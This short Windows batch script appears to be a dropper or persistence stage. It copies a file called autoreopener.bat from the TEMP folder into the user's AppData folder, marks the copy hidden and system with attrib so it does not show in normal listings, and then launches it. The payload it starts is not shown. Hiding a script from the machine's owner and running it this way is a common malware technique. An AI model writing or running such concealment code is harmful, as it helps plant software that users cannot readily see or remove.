@echo off
set "src=%TEMP%\autoreopener.bat"
set "appdata=%userprofile%\AppData"

if not exist "%src%" (
    echo Source file not found: %src%
    pause
    exit /b
)

copy "%src%" "%appdata%\autoreopener.bat" /Y
attrib +h +s "%appdata%\autoreopener.bat"

if %ERRORLEVEL%==0 (
    echo File copied successfully.
) else (
    echo Copy failed. Check permissions.
)

start "" "%appdata%\autoreopener.bat"

